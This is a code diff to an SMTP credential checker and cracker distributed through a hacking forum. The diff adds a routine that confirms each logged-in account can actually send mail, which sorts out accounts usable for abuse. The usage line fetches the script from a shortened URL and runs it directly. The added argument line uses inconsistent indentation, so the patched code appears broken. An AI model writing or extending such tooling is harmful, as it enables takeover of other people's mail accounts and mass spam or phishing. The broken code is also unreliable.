@@ -1,6 +1,6 @@
 #!/usr/local/bin/python3
 
-import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64
+import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64, uuid
 try:
 	import psutil, requests, dns.resolver
 except ImportError:
@@ -28,6 +28,9 @@ dangerous_regex = re.compile(dangerous_domains, re.IGNORECASE)
 # ПРАВКА: Предкомпилируем email regex для быстрой валидации
 EMAIL_REGEX = re.compile(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$')
 
+# Флаг: проверять возможность отправки MAIL FROM (True=исключать gateways)
+validate_send_mode = True
+
 b   = '\033[1m'
 z   = '\033[0m'
 wl  = '\033[2K'
@@ -49,7 +52,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v55.12.15{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v7.17.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -383,6 +386,36 @@ def socket_try_mail(sock, smtp_from, smtp_to, data):
 					return True
 	sock.close()
 	raise Exception(answer)
+    
+def smtp_validate_send_capability(sock, smtp_from_domain):
+    """
+    Проверяет, может ли сервер реально отправлять письма
+    БЕЗ отправки: использует MAIL FROM + RSET
+    Возвращает True только если сервер готов к отправке
+    """
+    try:
+        # Проверка 1: MAIL FROM с доменом пользователя
+        test_from = f'test-{uuid.uuid4().hex[:8]}@{smtp_from_domain}'
+        answer = socket_send_and_read(sock, f'MAIL FROM: <{test_from}>')
+        if not answer.startswith('250'):
+            debug(f'SKIP: Server rejected MAIL FROM: {answer[:50]}')
+            return False
+        
+        # Проверка 2: RCPT TO (можно на тестовый ящик)
+        test_recipient = f'validate-{uuid.uuid4().hex[:8]}@example.com'
+        answer = socket_send_and_read(sock, f'RCPT TO: <{test_recipient}>')
+        # 250 = OK, 251 = forward, 451 = temp error (норма для теста)
+        if not re.match(r'^(250|251|451)', answer):
+            debug(f'SKIP: Server rejected RCPT TO: {answer[:50]}')
+            return False
+        
+        # Проверка пройдена! Отменяем транзакцию
+        socket_send_and_read(sock, 'RSET')
+        return True
+        
+    except Exception as e:
+        debug(f'SKIP: Send validation error: {str(e)[:50]}')
+        return False
 
 # Устанавливаем таймаут для SMTP-соединения (30 секунд)
 socket.setdefaulttimeout(30)
@@ -390,14 +423,14 @@ socket.setdefaulttimeout(30)
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
     """
     Подключается к SMTP-серверу, выполняет логин с 1 повторной попыткой при таймауте.
+    Проверяет возможность отправки MAIL FROM (если validate_send_mode=True)
     """
-    global verify_email
+    global verify_email, validate_send_mode
     if is_valid_email(smtp_user):
         smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
     else:
         smtp_login = smtp_user
 
-    # ПРАВКА: Только 1 повторная попытка для чистых таймаутов
     for attempt in range(2):
         try:
             s = socket_get_free_smtp_server(smtp_server, port)
@@ -405,18 +438,24 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
             if answer[:3] == '220':
                 s = socket_try_tls(s, smtp_server) if port != '465' else s
                 s = socket_try_login(s, smtp_server, smtp_login, password)
+                
+                # ВАЖНО: Проверяем, может ли сервер ОТПРАВЛЯТЬ, а не только входить
+                if validate_send_mode:
+                    domain = smtp_user.split('@')[1]
+                    if not smtp_validate_send_capability(s, domain):
+                        s.close()
+                        raise Exception('Gateway detected: AUTH works but cannot send mail (MAIL FROM rejected)')
+                
                 s.close()
                 return True
             s.close()
             raise Exception(answer)
         except (socket.timeout, ConnectionResetError) as e:
-            # Только таймауты и сбросы - делаем 1 повтор
             if attempt == 0:
                 time.sleep(1.5)
                 continue
             return False
         except Exception as e:
-            # Любые другие ошибки (auth failed, etc) - сразу возвращаем False
             return False
     return False
 
@@ -505,13 +544,15 @@ check_ipv4()
 check_ipv4_blacklists()
 check_ipv6()
 try:
-	help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
+	help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug] [--validate-send|--fast]'
 	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+['']).pop(0)
 	verify_email = ([i for i in sys.argv if is_valid_email(i)]+['']).pop(0)
 	exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug)$', i)]+[bad_mail_servers])
 	start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
 	debuglevel = len([i for i in sys.argv if i == 'debug'])
 	rage_mode = len([i for i in sys.argv if i == 'rage'])
+    # Режим проверки отправки (по умолчанию включен)
+    validate_send_mode = '--validate-send' in sys.argv or '--fast' not in sys.argv
 	if not list_filename:
 		print(inf+help_message)
 		while not os.path.isfile(list_filename):
